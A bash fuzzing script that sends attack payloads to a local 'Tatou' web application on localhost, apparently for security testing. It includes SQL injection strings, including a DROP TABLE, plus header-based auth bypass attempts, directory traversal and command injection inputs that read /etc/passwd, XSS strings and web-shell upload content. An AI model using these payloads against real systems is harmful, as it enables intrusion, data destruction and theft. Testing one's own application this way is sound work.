#!/bin/bash

# Advanced Fuzzing Script for Tatou Application
# Tests various attack vectors and security vulnerabilities

echo "🔍 Starting Advanced Fuzzing Campaign..."
echo "Target: http://localhost:5000"
echo "Time: $(date)"
echo "=========================================="

# Create results directory
mkdir -p fuzzing_results
cd fuzzing_results

# Test 1: SQL Injection on login endpoint
echo "📝 Testing SQL Injection on /api/login..."
sql_payloads=(
    "' OR '1'='1"
    "' OR 1=1--"
    "admin'--"
    "' UNION SELECT * FROM users--"
    "'; DROP TABLE users;--"
    "' OR 'x'='x"
)

for payload in "${sql_payloads[@]}"; do
    echo "Testing payload: $payload"
    response=$(curl -s -X POST http://localhost:5000/api/login \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$payload\",\"password\":\"test\"}" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 2: Authentication bypass attempts
echo "🔐 Testing Authentication Bypass..."
bypass_headers=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "Authorization: Bearer admin"
    "Authorization: Basic YWRtaW46YWRtaW4="
    "X-API-Key: admin"
    "X-Auth-Token: admin"
)

for header in "${bypass_headers[@]}"; do
    echo "Testing header: $header"
    response=$(curl -s -X POST http://localhost:5000/api/upload-document \
        -H "Content-Type: application/json" \
        -H "$header" \
        -d '{"test":"data"}' \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 3: Parameter pollution and manipulation
echo "🎯 Testing Parameter Manipulation..."
param_tests=(
    "{\"email\":\"admin@admin.com\",\"password\":\"admin\",\"role\":\"admin\"}"
    "{\"email\":\"admin@admin.com\",\"password\":\"admin\",\"role\":\"\"}"
    "{\"email\":\"admin@admin.com\",\"password\":\"admin\",\"role\":null}"
    "{\"email\":\"admin@admin.com\",\"password\":\"admin\",\"role\":\"superadmin\"}"
    "{\"email\":\"admin@admin.com\",\"password\":\"admin\",\"bypass\":true}"
    "{\"email\":\"admin@admin.com\",\"password\":\"admin\",\"admin\":true}"
)

for test_data in "${param_tests[@]}"; do
    echo "Testing data: $test_data"
    response=$(curl -s -X POST http://localhost:5000/api/login \
        -H "Content-Type: application/json" \
        -d "$test_data" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 4: HTTP Method testing
echo "🔄 Testing HTTP Methods..."
methods=("GET" "POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")

for method in "${methods[@]}"; do
    echo "Testing $method method on /api/login"
    response=$(curl -s -X $method http://localhost:5000/api/login \
        -H "Content-Type: application/json" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 5: Directory traversal attempts
echo "📁 Testing Directory Traversal..."
traversal_payloads=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
)

for payload in "${traversal_payloads[@]}"; do
    echo "Testing traversal: $payload"
    response=$(curl -s "http://localhost:5000/api/get-watermarking-methods?file=$payload" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 6: Command injection attempts
echo "💻 Testing Command Injection..."
cmd_payloads=(
    "; ls -la"
    "| whoami"
    "&& id"
    "; cat /etc/passwd"
    "`whoami`"
    "$(id)"
)

for payload in "${cmd_payloads[@]}"; do
    echo "Testing command injection: $payload"
    response=$(curl -s -X POST http://localhost:5000/api/upload-document \
        -H "Content-Type: application/json" \
        -d "{\"filename\":\"test$payload.txt\"}" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 7: XSS attempts
echo "🎭 Testing XSS..."
xss_payloads=(
    "<script>alert('XSS')</script>"
    "javascript:alert('XSS')"
    "<img src=x onerror=alert('XSS')>"
    "\"><script>alert('XSS')</script>"
    "'><script>alert('XSS')</script>"
)

for payload in "${xss_payloads[@]}"; do
    echo "Testing XSS: $payload"
    response=$(curl -s -X POST http://localhost:5000/api/create-user \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$payload\",\"password\":\"test\"}" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

# Test 8: File upload testing
echo "📤 Testing File Upload..."
file_tests=(
    "{\"file\":\"test.php\",\"content\":\"<?php system('id'); ?>\"}"
    "{\"file\":\"test.jsp\",\"content\":\"<% Runtime.getRuntime().exec('id'); %>\"}"
    "{\"file\":\"test.asp\",\"content\":\"<% Response.Write(Request.ServerVariables('HTTP_USER_AGENT')) %>\"}"
    "{\"file\":\"test.exe\",\"content\":\"MZ\"}"
    "{\"file\":\"test.sh\",\"content\":\"#!/bin/bash\\necho 'test'\"}"
)

for test_data in "${file_tests[@]}"; do
    echo "Testing file upload: $test_data"
    response=$(curl -s -X POST http://localhost:5000/api/upload-document \
        -H "Content-Type: application/json" \
        -d "$test_data" \
        -w "%{http_code}")
    echo "Response: $response"
    echo "---"
done

echo "✅ Advanced Fuzzing Campaign Complete!"
echo "Results saved in fuzzing_results/"
echo "Time: $(date)"

